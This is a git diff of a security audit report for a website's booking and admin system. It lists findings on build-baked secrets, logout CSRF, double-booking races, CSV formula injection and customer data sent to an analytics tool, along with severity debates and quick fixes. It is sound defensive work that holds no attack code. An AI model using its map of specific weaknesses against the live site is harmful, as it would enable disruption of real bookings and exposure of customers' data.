+| F13 | Amplify-baked secrets are plaintext in build artifacts and cache; `instrumentation.ts` copies only 6/12, causing silent env bugs (`CONTACT_WEBHOOK_URL` never fires) | A05 | **Medium** | Medium | Tabriz |
+| F15 | Batch slot approve sets `confirmed` without a conflict check (`admin/…/bookings/route.ts:478-500`), so admin double-booking is possible; raw Prisma errors are returned | A04 | **Low** | Low | Kettle |
+| F16 | `sharp` < 0.35.5 high-severity advisory; no Dependabot | A06 | **Low** (not reachable) | Low | Tabriz |
+| F17 | Public repo: the cron workflow prints the response body with overdue booking references to world-readable Actions logs | A09 / info disclosure | **Low** | Low | Schneier |
+| F18 | Last-super-admin guard is read-then-write (race); `role` is not validated, so a bad value returns 500 (`accounts/[id]/route.ts:43-65`) | A04 | **Low** | Low | Hunt |
+| F19 | 24-bit booking reference with `@unique` and no retry, so a collision returns 500 (carried over from May #9) | — | **Low** | Low | Kettle |
+| F20 | `federated-logout` is a state-changing GET (logout CSRF); the endpoint cache never refreshes | A01 | **Low** | Low | Tabriz |
+| F21 | Contact webhook unsigned and has no timeout; `EmailLog.htmlBody` PII retained forever; no `Origin` check on admin mutations (carried over) | A08 / privacy | **Low** | Low–Med | Tabriz, Schneier |
+
+**Where the panel disagreed:**
+
+- **F1 severity.** Hunt argued for High, because the admin could notice and the customer could re-book. Kettle and Schneier held Critical: the attack is anonymous, needs one CAPTCHA solve, cancels *confirmed* bookings, sends official cancellation emails to real customers, and has no undo path in the product.
+- **F10.** Tabriz rated it Medium, because Clarity's dashboard is behind Microsoft auth. Willison and Hunt rated it High, because it's an ongoing transfer of every customer's PII to an undisclosed processor. High was kept.
+- **F2.** Hunt noted that admin review is a partial control. It stays High, because the queue doesn't flag the mismatch.
 
 ---
 
-## Quick-Wins Checklist (≤1 day each)
+## Quick wins (each under a day)
 
-1. **Add an `esc()` helper in [`email.ts`](src/lib/email.ts) and wrap every
-   user/admin-supplied interpolation.** Closes #1. ~30 minutes including test.
-
-2. **Re-read role/active from Postgres inside `requireAdmin` / `requireSuperAdmin`** (or
-   in the NextAuth `session` callback) and reject if the user is `active: false` or the
-   stamped role no longer matches. Closes #2 in the simplest form.
-
-3. **Add length caps on customer fields in `POST /api/calendar/bookings`** —
-   name ≤ 100, email ≤ 254, phone ≤ 40, purpose ≤ 1000. Closes #12 and reduces #4
-   exposure.
-
-4. **Add a honeypot field** (hidden `<input name="company">` in the booking form, reject
-   filled submissions server-side) — catches naive bots immediately. Two lines of code.
-
-5. **Add a CSP header to [`next.config.ts`](next.config.ts)** matching the policy in
-   Part 8. Closes #6.
-
-6. **Retry once on Prisma `P2002` (reference collision) in the booking POST.** Closes #9.
-
-7. **Add `signal: AbortSignal.timeout(5_000)` to the `fetch()` in
-   [`contact/route.ts:49`](src/app/api/contact/route.ts#L49).** Closes the slow-webhook
-   half of #8; sign the body with HMAC for the rest.
-
-8. **Verify `CONTACT_WEBHOOK_URL` is reaching production** — either bake via
-   `_AMPLIFY_CONTACT_WEBHOOK_URL` in `next.config.ts` (and update the prebuild allowlist),
-   or confirm Amplify is passing it through. Closes #10.
-
-9. **Replace the `EmailLog.htmlBody` column with a structured `payload jsonb`** (or stop
-   storing the full HTML; store the subject + a fingerprint). Removes the latent
-   XSS-on-render and the PII retention concern. Closes #13 partially; full GDPR delete
-   flow is a separate work item.
-
-10. **Add WAF rate-limit rule on `/api/calendar/bookings` and `/api/contact`** at the
-    Amplify / CloudFront layer — 5 req/min per IP. Closes the rest of #4. No code change.
-
----
-
-*Audit conducted on 2026-05-18 against the RMASA Website repository (branch: `main`).
-Re-run after any change to `src/lib/auth.ts`, `src/lib/email.ts`, `src/lib/calendar-store.ts`,
-or the introduction of any AI feature.*
+1. **[F1] Stop cascading on public submit.** In `POST /api/calendar/bookings`, pass `[]` as `overrideTargets` to `insertBookingWithCascade` and skip the override emails. Leave the cascade to the admin confirm path, which already does it. Write a one-off script to restore `cancelled_override` slots whose overriding booking is `rejected`.
+2. **[F2] Derive `endTime` on the server:** `fromMinutes(toMinutes(start) + eventType.durationMinutes)`. Reject `date < todayInColombo()`.
+3. **[F10] Keep Clarity off `/admin`.** Move the `<Script>` into a client component that returns `null` when `usePathname().startsWith("/admin")`. Add `data-clarity-mask="true"` to `.admin-section`.
+4. **[F7] Add `requireAdminPage()`.** It's `getServerSession` plus `loadActiveAdmin`, redirecting when inactive. Call it in `admin/calendar/layout.tsx`, and derive `isSuperAdmin` from the DB role.
+5. **[F8] Neutralise formulas in the CSV export:** `/^[=+\-@\t\r]/.test(s) ? "'" + s : s` in both CSV exporters.
+6. **[F6] Make Turnstile fail closed in production,** and check `data.hostname`.
+7. **[F3] Cap the payload:** `selectedSlots.length ≤ 50` and expanded slots ≤ 200 in the booking POST.
+8. **[F4] Strip `rejectReason` and `reason`** from the `week-snapshot` response and from the public 409 conflict messages.
+9. **[F16/F17] Hygiene:** run `npm audit fix` (sharp), add `.github/dependabot.yml`, and change the cron curl to `-o /dev/null -w '%{http_code}\n'`.
+10. **[F12] Turn on Cognito TOTP MFA** (optional at first, then required for `super_admin`). It doesn't need the domain.
